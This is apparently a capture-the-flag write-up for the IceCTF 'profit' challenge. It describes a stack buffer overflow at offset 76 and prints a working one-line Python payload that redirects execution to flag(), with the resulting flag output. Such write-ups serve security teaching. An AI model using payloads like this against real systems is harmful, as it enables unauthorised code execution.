### Solved by superkojiman

The goal is to call the flag() function at 0x804850b. NX and ASLR are both enabled on the target. I found that EIP could be overwritten at offset 76 in start() when fgets() is called. From there it was just a matter of providing the address of the flag() function:  


```
[ctf-14394@icectf-shell-2016 /home/profit]$ python -c 'print "A"*76 + "\x0b\x85\x04\x08"' | ./profit
Smashing the stack for fun and...?
IceCTF{who_would_have_thunk?}
[1]    26495 done                python -c 'print "A"*76 + "\x0b\x85\x04\x08"' |
       26498 segmentation fault  ./profit
```
